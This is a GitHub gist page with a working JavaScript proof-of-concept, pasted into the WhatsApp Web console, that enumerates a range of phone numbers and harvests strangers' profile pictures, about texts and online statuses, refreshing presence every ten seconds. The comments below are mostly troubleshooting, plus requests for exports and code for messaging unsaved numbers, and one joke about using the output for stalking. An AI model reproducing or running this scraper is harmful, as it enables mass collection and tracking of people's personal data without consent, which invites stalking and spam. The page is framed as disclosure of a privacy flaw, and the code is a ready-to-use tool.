Skip to content
LoranKloeze/whatsapp_phone_enumerator_floated_div.js
Last active 19 days ago • Report abuse
 Code
 Revisions 14
 Stars 308
 Forks 123
PoC WhatsApp enumeration of phonenumbers, profile pics, about texts and online statuses (floated div)
whatsapp_phone_enumerator_floated_div.js
/****** I've created a Chrome extension from this script, take a look at https://github.com/LoranKloeze/WhatsAllApp ********/

/******************** Keep in mind: this script is frozen. Check the url mentioned above. **********************************/
/******************** Keep in mind: this script is frozen. Check the url mentioned above. **********************************/
/******************** Keep in mind: this script is frozen. Check the url mentioned above. **********************************/
/******************** Keep in mind: this script is frozen. Check the url mentioned above. **********************************/
/******************** Keep in mind: this script is frozen. Check the url mentioned above. **********************************/
/******************** Keep in mind: this script is frozen. Check the url mentioned above. **********************************/

// Was this script of any use for you? Please consider a donation. It has taken me a lot of time to figure this 
// stuff out and to keep it up to date. Even $5 or $10 is very much welcome! :)
// Paypal: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=PHVYMCEVZNLPA
// Bitcoin: 1DTqXrfnQrUutj7bGtKuhc5hP2DhZLXMC8


/*
 PoC WhatsApp enumeration of phonenumbers, profile pics, about texts and online statuses
 Floated div edition
 30-05-2017
 
 (c) 2018 - Loran Kloeze - loran@ralon.nl
 
 This script creates a UI on top of the WhatsApp Web interface. It enumerates certain kinds
 of information from a range of phonenumbers. It doesn't matter if these numbers are part
 of your contact list. At the end a table is displayed containing phonenumbers, profile pics, 
 about texts and online statuses. The online statuses are being updated every
 10 seconds.
 
 Check for an explanation: https://www.lorankloeze.nl/2017/05/07/collecting-huge-amounts-of-data-with-whatsapp/
 
 Instructions:
  - Open WhatsApp web
  - Make sure the phone is connected to the WhatsApp Web (past the QR-code screen)
  - Open up the console (F12) (Firefox users: type 'allow pasting' if you haven't done so yet)
  - Select the contents of this complete file and copy/paste it to the console
  - Never, NEVER do something like this if you're not 100% sure this file is from a thrustworthy source! 
  - You'll see a UI with 2 textboxes and a button
  - You may close the console now
  - Enter a range of phonenumbers you want to enumerate, more than 500 numbers is probably a little much 
  - After a few sec you'll see a table of phonenumbers, profile pics, about texts and on/offline statuses
  - Every 10 sec, the script checks if someone is online and places that number at the beginning of the table
  - If someone is currently online, the left border of the profile picture becomes green
  
  You can drop this script in Tampermonkey or something like that. It only depends on libraries
  provided by WhatsApp Web.
*/

(function() {
    'use strict';
	
	var whenStoreIsReady = function () {
		console.log('Starting WhatsAllApp UI')

		// Prevent huge traffic/mem usage
		var maxNrClients = 1500;
		
		// Standard phone numbers for the 2 text boxes in the UI
		var firstNumberStd = 31642101000;
		var lastNumberStd =  31642101100;



		function setupContainerEventListeners() {		
			var btnDeactivateWhatsApp = document.getElementById('btnCloseWhatsAllApp');
			btnDeactivateWhatsApp.addEventListener("click", function( e ) {
				var divContainer = document.getElementById('statusIndexer');
				divContainer.outerHTML = '';
				var startBtnDiv = document.getElementById('btnOpenWhatsAllApp');
				startBtnDiv.classList.remove('hide');
				
			});
			
			var btnStartIndexer = document.getElementById('btnStartIndexer');
			btnStartIndexer.addEventListener("click", function( e ) {
				var firstNr = document.getElementById('inpFirstNumber').value;
				var lastNr = document.getElementById('inpLastNumber').value;
				var divClientBoxes = document.getElementById('divClientBoxes');
				divClientBoxes.innerHTML = "";
				firstNr = parseInt(firstNr, 10);
				lastNr = parseInt(lastNr, 10);
				if (isNaN(firstNr) || isNaN(lastNr) ) {
					console.log('Numbers should be integers');
					return null;
				}

				if (lastNr - firstNr > maxNrClients) {
					console.log('Don\'t query more than ' + maxNrClients + ' numbers right now');
					return null;
				}
				var clientNr = firstNr;
				
				var clientBoxCreateT = window.setInterval(function(){
					console.log('Next 100...');
					var lastClientNrForLoop = clientNr + 100;
					for(;clientNr <= lastClientNrForLoop && clientNr <= lastNr; clientNr++) {
						divClientBoxes.appendChild(createClientBox(clientNr, "", "" ));
					}
					if (clientNr > lastNr)
						clearInterval(clientBoxCreateT);
				}, 500);


			});

		}
		
		// Button to enable the UI
		function addActivateBtn() {
			var body = document.getElementsByTagName('body')[0];
			var startBtnDiv = document.createElement("div");
			startBtnDiv.innerHTML = '<div class="titleText">Whats<br/>All<br/>App</div>';
			startBtnDiv.id = 'btnOpenWhatsAllApp';
			startBtnDiv.addEventListener("click", function( e ) {
				createDOM();
				setupContainerEventListeners();
				this.classList.add('hide');
			});
			
			var style = "";
			style += "#btnOpenWhatsAllApp { height: 70px; border-radius: 50px; width: 70px; background-color: #43d854;  ";
			style += "position: fixed; top: 15px; left: 15px; z-index: 99999; box-shadow: 0 1px 1px 0 rgba(0,0,0,0.06), 0 2px 5px 0 rgba(0,0,0,0.2);}";
			style += "#btnOpenWhatsAllApp:hover { box-shadow: none; top:16px; cursor: pointer; }";
			style += "#btnOpenWhatsAllApp.hide { display: none; }";
			style += "#btnOpenWhatsAllApp .titleText {text-align: center; font-size: 13px; padding-top: 14px; color: white; }";
			var styleEl = document.createElement("style");
			styleEl.innerHTML = style;
			body.appendChild(startBtnDiv);
			body.appendChild(styleEl);
		}

		// The UI that's added to the current DOM
		function createDOM() {
			var body = document.getElementsByTagName('body')[0];
			var containerDiv = document.createElement("div");
			containerDiv.id = 'statusIndexer';
			
			var closeBtnDiv = document.createElement("div");
			closeBtnDiv.id = 'btnCloseWhatsAllApp';
			closeBtnDiv.innerHTML = '<div class="titleText">Close</div>';

			var inputFirstNumberLabel = document.createElement("label");
			inputFirstNumberLabel.innerHTML = 'First phone number';
			var inputFirstNumber = document.createElement("input");
			inputFirstNumber.type = "text";
			inputFirstNumber.placeholder = "31612345678";
			inputFirstNumber.value = firstNumberStd;
			inputFirstNumber.id = "inpFirstNumber";

			var inputLastNumberLabel = document.createElement("label");
			inputLastNumberLabel.innerHTML = 'Last phone number';
			var inputLastNumber = document.createElement("input");
			inputLastNumber.type = "text";
			inputLastNumber.placeholder = "31612345678";
			inputLastNumber.value = lastNumberStd;
			inputLastNumber.id = "inpLastNumber";

			var btnStartIndexer = document.createElement("button");
			btnStartIndexer.id = 'btnStartIndexer';
			btnStartIndexer.innerHTML = 'Start indexer';

			containerDiv.appendChild(closeBtnDiv);
			containerDiv.appendChild(inputFirstNumberLabel);
			containerDiv.appendChild(inputFirstNumber);
			containerDiv.appendChild(inputLastNumberLabel);
			containerDiv.appendChild(inputLastNumber);
			containerDiv.appendChild(document.createElement("br"));
			containerDiv.appendChild(btnStartIndexer);
			containerDiv.appendChild(document.createElement("hr"));
			var clientBoxesDiv = document.createElement("div");
			clientBoxesDiv.id = 'divClientBoxes';
			containerDiv.appendChild(clientBoxesDiv);

			var style = "";
			style += "#statusIndexer {position: absolute; top: 0px; left: 0px; min-height: 50%; overflow: scroll; max-height: 95%; background-color: rgba(230,230,230,1); z-index: 99999999; width: 95vw; padding: 50px; border-bottom: solid 3px #58e870; box-shadow: black 0px 1px 62px 0px;}";
			style += "#statusIndexer label {margin: 0 15px 0 0;}";
			style += "#statusIndexer input {margin: 0 25px 0 0; padding: 5px;}";
			style += "#statusIndexer button {margin: 10px 0; border: solid 1px black; padding: 3px; border-radius: 3px; }";
			style += "#statusIndexer button:hover {background-color: #58e870;}";
			style += "#statusIndexer .indexerClientBox {float: left; width: 120px; text-align: center; margin: 15px; height: 65px;}";
			style += "#statusIndexer img {width: 32px; height: 32px;}";
			style += "#statusIndexer img.isOffline {border-left: solid 5px orange;}";
			style += "#statusIndexer img.isOnline {border-left: solid 5px green;}";
			style += "#statusIndexer .indexerPhone {font-size: 13px; margin: 2px; font-weight: bold;}";
			style += "#statusIndexer .indexerStatus {font-size: 11px; margin: 2px;}";
			style += "#btnCloseWhatsAllApp { height: 50px; border-radius: 25px; width: 50px; background-color: #f44336;  ";
			style += "position: fixed; top: 15px; right: 15px; z-index: 99999; box-shadow: 0 1px 1px 0 rgba(0,0,0,0.06), 0 2px 5px 0 rgba(0,0,0,0.2);}";
			style += "#btnCloseWhatsAllApp:hover { box-shadow: none; top:16px; cursor: pointer; }";
			style += "#btnCloseWhatsAllApp .titleText {text-align: center; font-size: 13px; padding-top: 18px; color: white; }";
			var styleEl = document.createElement("style");
			styleEl.innerHTML = style;
			body.appendChild(styleEl);
			body.appendChild(containerDiv);
		}
		
		
		// Create a floated div per phonenumber and execute WhatsApp API queries
		function createClientBox(phonenumber) {
			var divBox = document.createElement("div");
			divBox.classList.add('indexerClientBox');
			divBox.id = 'p'+phonenumber;
			var imgSrcNoneFound = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEsAAABLCAIAAAC3LO29AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABDRJREFUeNrsmj1IW1EUgGMNWLBGUIigIlVoq4LUQqsuXerP4uLf4qDSLh1aaRehCk6CDl0q2qFDf6yDi1YXF0272EFLoQWLkQoKGgsKKZggjaCkX97Bx0s01qA2Uc4jhHd/c757zj33nEuSgsGg7UI/l2wX/VFCJVRCJVRCJVRCJVRCJVRCJVRCJVRCJVRCJVRCJVTCUyDcGP3gnXJZi1uzX44e8uvN0PaC+9wQbo6Nux8+MiWmuDU7d/SQ1f7Bf67C6T72k453OH52dN6anIioB3vX57c70lKLi6z1JSPvkx0OXuBMLS7cXliUPtI/JTfncm6OdQZqdjzr9LQbo+JAmH2/FbVge9kP2szKpY5OLDa9ogwAvotevTSblnt608vL8p62zze3ALbn8wU869ITVJBKJyeAtM6w6/OVjAzzHjdPAxuQCGquPcJBhVhojI1K8dCBmdWVt2c+ZTU1oE/ASg1D+D3lkhmM4cN5Tx7H35ciBMu/0tMrRdlmmTVVfKMlPjv78BFPekU53yk52fRBb9gh1ojGWBSKojRnU338CZEsv7vLG1r7RYrJjjS+EVRao+GFz5AWMaFpEccZ/j/OQzTGR6jQDCKu9PQhJbuOSmdTQ0yzZdRUMQNbEXPAjcWTEOtK2Xd9qBG7Emd47Xkfx8bXu/fYVGxI0z1ah9BZVEfR9LfSSn9GBTye1f6BK0ZThJJje4IJ+fxZ88jL+ut3M1evn2Qquy0hnx/NLRybqA5DLejuOslUSYn5TwX2sPgYawxwoQg1t0hUwmjJBza5+mIgEH70SeX5ICT/IAo9IvlgyxH3RRzuUhn/3OJ40XmbGeKcAyvFcjjKP+ffQDPITXF5PyLFCKnEur7V1tGBbmKTnN1bc2HGSbwye/MOH3NsKDl+OySVB42TbtGaTp+QsIOAg5wA6TdHx/HmpE6iorX+QYlXSKnoQM+ljmdibxF5fUZ1JWkH8zDWvCVgaaghjo/IkqEiNiLzoJWmWK8IYiYk2uLnJZMALNOIIY2w242IGKQcX2tGPhWIEjcDzxCCMsm2pLLAiPvIxWi1blfv9EcWbjPkpeaY3HpvciaE32vrvNMuZ2O9qAs8IHEhG2PjyIcELDlhd2pRYVZjfbTTnEm23YssR8QNwKGphlVp/K7kXGdFiPaQj8WW9M/8VeoxJKeBxJYjqbOm/Ac9J8rH5FgRq/8UEpqMfN9hTVwo5j1tl0+syb49xk0Yui/BnRA0hgT1+8VuUd2uz29mvexPxI124yTKxxvthTtY9hjWAR4dWCPJNiXDnm9uxW/JnQ0bMqY7m5ijNnRo7Idcfg8RxcyoNN9DO2fKhSowpx3jDsZsBZulYTlkEsmMJMKGh+VjoJi9qUzRmLyLAR9q2BqXKqESKqESKqESKqESKqESKqESKqESKqESKqESKqESKqHtrwADAMxLRItbnk5RAAAAAElFTkSuQmCC";

			var clientImgA = document.createElement("a");
			var clientImg = document.createElement("img");
			var profilePicRoutine = function(nr) {			
				// Cut it out when UI is no longer active
				if (document.getElementById('statusIndexer') == null)
					return;
				
				WLAPStore.ProfilePicThumb.find( nr + '@c.us').then(function(d){
					var imgATag = document.getElementById('p'+nr).getElementsByTagName('a')[0];
					var imgTag = document.getElementById('p'+nr).getElementsByTagName('img')[0];

					if (d.img === null) {
						profilePicRoutine(nr);
					}
					if (d.img === undefined) {
						imgTag.src = imgSrcNoneFound;
						imgATag.href = '';
					} else {
						imgTag.src = d.img;
						imgATag.href = '#';
						imgATag.addEventListener('click', function(){
							imgTag.src = d.imgFull;
							window.open(d.imgFull, '_blank');
						});
						imgATag.target = '_blank';

					}
				}, function(e){
					// Server is throttling/rate limiting, we try it again
					profilePicRoutine(nr);
				});
			};

			profilePicRoutine(phonenumber);

			clientImgA.appendChild(clientImg);
			var clientPhone = document.createElement("div");
			clientPhone.classList.add('indexerPhone');
			clientPhone.innerHTML = phonenumber;
			var clientStatus = document.createElement("div");
			clientStatus.classList.add('indexerStatus');

			var statusFindRoutine = function(nr) {
				
				// Cut it out when UI is no longer active
				if (document.getElementById('statusIndexer') == null)
					return;
				
				WLAPWAPStore.statusFind( nr + '@c.us').then(function(d){
					document.getElementById('p'+nr).getElementsByClassName('indexerStatus')[0].innerHTML = d.status;
				}, function(e){				
					// Server is throttling/rate limiting, we try it again
					statusFindRoutine(nr);
				});
			};
			statusFindRoutine(phonenumber);


			WLAPStore.Presence.find( phonenumber + '@c.us').then(function(d){
				if (d.isOnline)
					clientImg.classList.add('isOnline');
				else
					clientImg.classList.add('isOffline');

			});

			divBox.appendChild(clientImgA);
			divBox.appendChild(clientPhone);
			divBox.appendChild(clientStatus);
			return divBox;
		}


		// Check online/offline status every 10 sec
		window.setInterval(function() {					
			// Cut it out when UI is no longer active
			if (document.getElementById('statusIndexer') == null)
				return;
			
			for(var i=0; i < WLAPStore.Presence.models.length; i++) {
				var m = WLAPStore.Presence.models[i];
				var id = 'p' + m.id.slice(0, -5);
				var clientBox = document.getElementById(id);
				if (clientBox !== null) {
					var img = clientBox.getElementsByTagName('img')[0];
					img.classList.remove('isOnline');
					if (m.isOnline) {
						console.log(id + ' is online');
						clientBox.parentNode.prepend(clientBox);
						img.classList.remove('isOffline');
						img.classList.add('isOnline');
					} else {
						img.classList.remove('isOnline');
						img.classList.add('isOffline');
					}
				}

			}
		}, 10000);
		
		// Let's setup the UI
		window.setTimeout(function(){
			if (document.getElementsByClassName('qr-wrapper-container').length == 0)
				addActivateBtn();
		}, 500);
	
	}
	
	
	
	var scripts = document.getElementsByTagName('script');
	var regExAppScr = /\/app\..+.js/;
	var regExApp2Scr = /\/app2\..+.js/;
	var appScriptLocation = '';
	var app2ScriptLocation = '';
	window.WLAPStore = {};
	window.WLAPWAPStore = {};

	for (var i=0; i<scripts.length;i++) {
		var src = scripts[i].src;
		if (regExAppScr.exec(src) != null) {
			appScriptLocation = src;
		}
		
		if (regExApp2Scr.exec(src) != null) {
			app2ScriptLocation = src;
		}
	}

	fetch(app2ScriptLocation).then( e => {
		var reader = e.body.getReader();
		var js_src = "";	
		
		return reader.read().then(function readMore({done, value}){
			var td = new TextDecoder("utf-8");
			var str_value = td.decode(value);
			if (done) {
				js_src += str_value;
				var regExDynNameStore = /'"(\w+)"':function\(e,t,a\)\{\"use strict\";e\.exports=\{AllStarredMsgs:/;
				var res = regExDynNameStore.exec(js_src);
				var funcName = res[1];
				webpackJsonp([], { [funcName]: (x, y, z) => window.WLAPStore = z('"'+funcName+'"') }, funcName);
				console.log('Created Store');
				return;
			}		
			
			js_src += str_value;
			return reader.read().then(readMore);
			
		})
		
	}).then( () => {
		fetch(appScriptLocation).then( e => {
			var reader = e.body.getReader();
			var js_src = "";	
			
			return reader.read().then(function readMore({done, value}){
				var td = new TextDecoder("utf-8");
				var str_value = td.decode(value);
				if (done) {
					js_src += str_value;
					var regExDynNameStore = /Wap:n\('"(\w+)"'\)/;
					var res = regExDynNameStore.exec(js_src);
					var funcName = res[1];
					webpackJsonp([], { [funcName]: (x, y, z) => window.WLAPWAPStore = z('"'+funcName+'"') }, funcName);
					console.log('Created Store WAP');
					whenStoreIsReady()
					return;
				}		
				
				js_src += str_value;
				return reader.read().then(readMore);
				
			})	
		})
	})


})();
@C0dekid C0dekid commented on 9 May 2017 • 
Thanks! It actually worked 👍

@ghost ghost commented on 9 May 2017
This is such an insane privacy breach. I'm baffled that Facebook/WhatsApp won't fix this.

@FreekdeMan FreekdeMan commented on 9 May 2017
Impressive find.

@LoranKloeze LoranKloeze commented on 10 May 2017
Thanks guys!

@antonsteenvoorden antonsteenvoorden commented on 10 May 2017
Nice exploit!

@hipio but it isn't really a security breach. You actually allow "Everyone" to see your profile picture. It really means everyone. You could do this exact thing by just adding a ton of random contacts to your phone and view their WhatsApp picture there (which would be a huge waste of time.. ;p)

@LoranKloeze LoranKloeze commented on 10 May 2017
Thx and I agree with you that it's not a security breach in the sense of getting access to restricted stuff. It's more a privacy breach. Beware of adding a lot of contacts: some people tell me it may get you banned. Since using the API calls is something else than adding contacts, it seems the banning doesn't apply to this script.

@sh4ka sh4ka commented on 12 May 2017 • 
You just automated the exploit of a feature that can be disabled by the user. If something, this adds to the fact that we are responsible for what we share. It is a really nice example of what can be done with enough knowledge, good one.

@ejinotti ejinotti commented on 12 May 2017
Typo on line 54 I think. You prob want if (isNaN(firstNr) || isNaN(secondNr)), but as-is you are just checking the first number twice 😉

@shapeshed shapeshed commented on 12 May 2017 • 
2017-05-12-130948_505x253_scrot

Seems like you have access to Presence, Last Seen, Picture, Status, Phone Number

Is Presence equivalent to online? If so it would be possible to monitor the network and say person A is online when people N are also online. If the pattern is consistent you can infer the identity of a group. This would seem to be a bad privacy leak.

@mdvb1001 mdvb1001 commented on 12 May 2017
Very impressive!

@LoranKloeze LoranKloeze commented on 12 May 2017
@ejinotti, you're right, fixed it, thx!

@alexmoreno alexmoreno commented on 12 May 2017
Now it returns me only 404.
image

@LoranKloeze LoranKloeze commented on 12 May 2017
I just checked it, it still works. Did you copy/paste the code in the console?

@asaks asaks commented on 12 May 2017 • 
Does not work in Firefox.

@LoranKloeze LoranKloeze commented on 12 May 2017
It should, just tested it in FF. Did you type 'allow pasting' in the console before the copy/paste?

@asaks asaks commented on 12 May 2017
@LoranKloeze
Yes. The input fields appear, but by clicking on the button, nothing happens.

@LoranKloeze LoranKloeze commented on 12 May 2017
Any error messages in the console? Very, very old FF's don't support WebSockets, I take it your FireFox is recent enough?

@asaks asaks commented on 12 May 2017
FF 53.0.2. In the console, only the inscription "undefined"

@LoranKloeze LoranKloeze commented on 12 May 2017
Ok, and does it give you a line number or a reference into the code?

@alexmoreno alexmoreno commented on 12 May 2017
@LoranKloeze Here in Brazil we "added" 9 before all our numbers (to support more numbers). I tried without the 9 (I was trying using the 9 when it was not working) and it worked.

@j3th9n j3th9n commented on 12 May 2017 • 
"stalkingmode" And if you see in the profile pic a girl or guy to one's liking, you can copy paste the phonenumber in Facebook's "Find friends" field and get even more information/pictures."/stalkingmode"

@MZorzy MZorzy commented on 12 May 2017
6 years ago. generate a big .vcf files, dump sqlite's contact's file. take only WA number. delete non WA from contact.

over year people going old, married, make babies, buy a pet, leave wa ...

but this is a much better .awesome

@NbR404 NbR404 commented on 12 May 2017
It works! Great!

@MPursche MPursche commented on 13 May 2017
Does this exploit still work if users have restricted their access to their profile picture to people in their address book in the settings?

@LoranKloeze LoranKloeze commented on 13 May 2017
I'm not sure. I hear about people who have restricted all access in those settings and even then others still can see their on/offline statuses using these API calls.

@eratoxam eratoxam commented on 13 May 2017
What does '429' in status text mean? Could it be a place-holder for non-used numbers?

@stek29 stek29 commented on 13 May 2017
@eratoxam Error 429 usually means "Too Many Requests". Not sure about WA.

@Premx Premx commented on 13 May 2017
telegram > whatsapp lmao

@Radobilly Radobilly commented on 13 May 2017
Nice, this means someone could now write a script with yowsup to inform every user about how to update his or her privacy settings. Or to switch to telegram 👍

@bammat bammat commented on 14 May 2017 • 
is the script still working. my firefox want to debug the script because a error. at the time the firefox automaticly closed

@Systemfloh Systemfloh commented on 14 May 2017
i allways get the follwing massage:
Uncaught ReferenceError: Store is not defined
at profilePicRoutine (:146:13)
at createClientBox (:172:9)
at :69:48
profilePicRoutine @ VM100:146
createClientBox @ VM100:172
(anonymous) @ VM100:69
Whats wrong? thx for your help.

@bammat bammat commented on 15 May 2017
i think it don´t working at the time

@LoranKloeze LoranKloeze commented on 15 May 2017
I can confirm the script still works.

@LoranKloeze LoranKloeze commented on 15 May 2017
@Systemfloh, what browser + version?

@bammat bammat commented on 15 May 2017
hm, that´s my message

A script on this page may be busy or no longer responds. You can now stop the script, open it in the debugger, or continue.

Script: https://web.whatsapp.com/app.ba94389119e9b454d5a7.js:2

console message:
Error: Script terminated by timeout at:
w@https://web.whatsapp.com/app.ba94389119e9b454d5a7.js:2:1
T@https://web.whatsapp.com/app.ba94389119e9b454d5a7.js:2:7181
P@https://web.whatsapp.com/app.ba94389119e9b454d5a7.js:2:8975

@Systemfloh:
Do you start the script at: https://web.whatsapp.com/

i had the same problem, because was not on this site.

@TarasZelyk TarasZelyk commented on 15 May 2017
@LoranKloeze, but this still doesn't allow to enumerate all phone numbers of registered users, yes? Because it returns the same data for unregistered user and user without an avatar and with default status, so you can't distinguish them.

@ghost ghost commented on 15 May 2017
Throws "mmi671.whatsapp.net/d/r1VLGgwlTmGlshPTQs8NOFjIGT8/AuQfpjMSf7xresoiIaB4MOCbfMW268S39F_1gHWidq4W.enc:1 GET https://mmi671.whatsapp.net/d/r1VLGgwlTmGlshPTQs8NOFjIGT8/AuQfpjMSf7xresoiIaB4MOCbfMW268S39F_1gHWidq4W.enc 404 (Not Found)
mmi297.whatsapp.net/d/zafB9ypMyWuW8-zNsfcWb1jIEe4/ApvsSF4p92j2glA2mjYnVoae19RYogQD96T6LEgLOsYX.enc:1 GET https://mmi297.whatsapp.net/d/zafB9ypMyWuW8-zNsfcWb1jIEe4/ApvsSF4p92j2glA2mjYnVoae19RYogQD96T6LEgLOsYX.enc 404 (Not Found)"

@LoranKloeze LoranKloeze commented on 15 May 2017
This script is a Proof of Concept, not a complete software package that has been tested in all kinds of environments and browsers. So yes, you may encounter error messages. I've created and tested this script in Chrome 58.0.3029.96 (64-bit) on Windows. And, as stated in the instructions, you should drop this script in an open and authenticated https://web.whatsapp.com page. Otherwise you will see error messages about missing global vars like Storage.

@LoranKloeze LoranKloeze commented on 15 May 2017
@TarasZelyk At this moment the script doesn't tell you if a specific phone number is connected to a WhatsApp account. But that information may be available, it just doesn't bubble up into the UI. I don't know for sure.

@Obre Obre commented on 15 May 2017
would large modifications be necessary to make this work in Safari?

@LoranKloeze LoranKloeze commented on 15 May 2017
No modifications needed: it should work in Safari out of the box. Just tested it. Make sure you have enabled developer tools in Safari's settings. Then you can copy/paste this script in the console.

@Obre Obre commented on 15 May 2017 • 
wow this is huge
works..

EDIT:
stopped to work this error
WebSocket connection to 'wss://w7.web.whatsapp.com/ws' failed: Failed to send WebSocket frame.

2 edit:
aand it works again

@bammat bammat commented on 15 May 2017
Is it possible that my internet connection is to slow because of this message: A script on this page may be busy or no longer responds. You can now stop the script, open it in the debugger, or continue.

is it possible to export the results to excel / word or something else ?

@Systemfloh Systemfloh commented on 16 May 2017
@LoranKloeze
MacOS 10.12, Crome Version 58.0.3029.110 (64-bit)
thx a lot

@LoranKloeze LoranKloeze commented on 16 May 2017
@bammat It's unlikely that a slow internet connection would break javascript in WhatsApp Web. A very very buggy internet connection might break it when WhatsApp Web keeps trying to create new WebSockets.

Exporting tot Excel/Word is not as easy as it sounds since creating a downloadable file from javascript is not possible as far as I know. But it is possible to create the data in csv format so you can copy/paste it. I would have to edit the script for that to work ;)

@LoranKloeze LoranKloeze commented on 16 May 2017
@SystemFlow As @bammat pointed out: do you drop the script in the same tab as where web.whatsapp.com is running?

@Systemfloh Systemfloh commented on 16 May 2017
@LoranKloeze no i dont :-( i will try

@bammat bammat commented on 16 May 2017
yes, i try it within the tab. i will try it tomorrow with another computer and a faster internet connection

@LoranKloeze LoranKloeze commented on 17 May 2017
I've created a Chrome extension from this script, take a look at https://github.com/LoranKloeze/WhatsAllApp

@fonsanan fonsanan commented on 17 May 2017
has anyone modified the script to export (in csv) online times (with timestamp) ?

@BenderIsTheGreatest BenderIsTheGreatest commented on 20 May 2017
Couldn't this be used to also include the name of a number? Because I have seen that in group chats, numbers I do not know with a name after them.

@steffen1971 steffen1971 commented on 25 May 2017
Is there any way to find out if someone blocks me? I guess state "401" is an indicator, but it not sufficient.

@jegue jegue commented on 24 Jul 2017
Very impressive! 2

@pete1968 pete1968 commented on 15 Aug 2017
impressive!
but the code doesn't makes a timeline or doesn't it work right in my webconsole?

@thisisishara thisisishara commented on 18 Aug 2017
did not work for sri lankan numbers.
eg: 0712699345- 0712699369

great if you could improve this. Excellent work!

@avirex12 avirex12 commented on 20 Aug 2017
I need some help to develop a business tool out of this. Please contact me if you already have or want to start a paid development.

@deounix deounix commented on 16 Dec 2017 • 
how can I start new chat with some number not saved in my contact ?

I'm trying

var Chats = Store.Chat.models;
var contact = '961xxxxxxxxx';

var user = Store.Contact.models.find(function (e) { return e.__x_id.search(contact)!=-1 });

Store.Chat.add({ id: user.__x_id, }, { merge: true, add: true, });

but it didn't working

@duzaq duzaq commented on 31 Dec 2017
@deounix

X_sendMessage = function(to = null, body = null) {
if (to == null || body == null) return {
'status': 401,
'status_msg': "Invalid user or body text"
}
var id = X_makeID();
var msg = Store.Msg.models[0];
msg.id.id = id;
msg.id.remote = to + "@c.us";
msg.type = "chat";
msg.body = body;
msg.to = to + "@c.us";
msg.t = Math.ceil(new Date().getTime() / 1000);
Store.Msg.send(msg);
};

X_makeID = function() {
var text = "";
var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
for (var i = 0; i < 20; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
return text;
};X_sendMessage(961xxxxxxxxx, "test");

@chirag90851 chirag90851 commented on 23 Jan 2018
Text message sending is working.. Have you Any javascript for send Media from web.whatsapp.com ?

@m2datacenter m2datacenter commented on 21 Feb 2018
@chirag90851 Do you found how to send media?

@4st3r1x 4st3r1x commented on 6 Mar 2018
@LoranKloeze is it possible to check a list of numbers instead of doing rang of numbers?

@edsonalvesan edsonalvesan commented on 7 Mar 2018
@LoranKloeze You can only return users who have an account in whtasApp, so it returns numbers that do not have an account.

@emmanuelbis72 emmanuelbis72 commented on 25 Apr 2018
Is there any way to export the list for reuse or to send private messages ?

@yahyaanwar yahyaanwar commented on 25 May 2018
Store object vanished!
Let me know if same got by others!

@oltanalkan oltanalkan commented on 26 May 2018
@LoranKloeze @duzaq

Uncaught ReferenceError: Store is not defined
at :1:24

I guess it's not working anymore

@marcelorufo marcelorufo commented on 26 May 2018
Possibly they minified their code changing names of variables and objects.

@azharuddinkhan8898 azharuddinkhan8898 commented on 26 May 2018
Yes, Store is not defined. What is the solution?

@Schuchhardt Schuchhardt commented on 28 May 2018 • 
i found it! just check if Store exists, if not pull out from webpack

if (window.Store === undefined) {
    webpackJsonp([], {"bcihgfbdeb": (x, y, z) => window.Store = z('"bcihgfbdeb"')}, "bcihgfbdeb");
    webpackJsonp([], {"iaeeehaci": (x, y, z) => window.Store.Wap = z('"iaeeehaci"')}, "iaeeehaci");
}
@naushrambo naushrambo commented on 29 May 2018
@schgressive Thanks a lot bro. Day Saver

@AdamSmith1020 AdamSmith1020 commented on 30 May 2018
@schgressive: Status find not working, but rest else worked like magic, Thanks bro :)

@LoranKloeze LoranKloeze commented on 31 May 2018
@schgressive, thx for your contribution! That way of creating the Store is a little tricky since those function names are dynamically generated.

I've introduced some kind of hack in the script that searches for the correct function names for the Store and the WAP connector. Give it a try. Feedback is welcome at the official repo: https://github.com/LoranKloeze/WhatsAllApp

@AdamSmith1020 AdamSmith1020 commented on 31 May 2018
Thanks for the wonderful work LoranKloeze, appreciated. submitted a small donation for your time.

I have modified your script to suit my needs. One thing that I wanted to do was to save the result directly onto an external file (so that if Chrome is closed by mistake, which happened a number of times, I can still go to the external file to see results). Just wondering if you could please share some code to do the same. Thanks :)

@marcelorufo marcelorufo commented on 1 Jun 2018
Is it possible to get user name?

@LoranKloeze LoranKloeze commented on 1 Jun 2018
@AdamSmith1020, thank you! Check out this link for saving it to a local file: https://www.noupe.com/design/html5-filesystem-api-create-files-store-locally-using-javascript-webkit.html

@AdamSmith1020 AdamSmith1020 commented on 2 Jun 2018
@LoranKloeze, thank you and much appreciated. Useful link. Keep up the good work mate :)

@tchiks tchiks commented on 28 Jul 2018
Thank you for your solution. it's a awesome job. but can I want check if the number exists on whatsapp without downloading the picture?
it will allow me to save my connection. Please Help me!!

@tchiks tchiks commented on 31 Jul 2018
please how do for get profile name of an account whatsapp..

@greyIsNotBlack greyIsNotBlack commented on 10 Aug 2018
Is it working still? I'm not able to use it. I'm getting an error from line number: 366. "res is null"

@99ats 99ats commented on 18 Aug 2018
image

@apnerve apnerve commented on 15 Nov 2018
@chirag90851 This one works fine - https://gist.github.com/phpRajat/a6422922efae32914f4dbd1082f3f412

@Zibri Zibri commented on 18 Feb 2019
If you are interested I just found a fast way to get the Store object in a fast way:

https://github.com/Zibri/WhatsAppWebApi/blob/master/zstore.js

@vinothmp7 vinothmp7 commented on 9 Oct 2019
@LoranKloeze ,
Capture

var funcName = res[1];
error in this line as cannot read property of '1' or null

@tonystaark tonystaark commented on 24 Nov 2019
same error as above

@EeveeWhitefire EeveeWhitefire commented on 29 Jan 2020
yeah. same here

@Zibri Zibri commented on 3 Feb 2020 • 
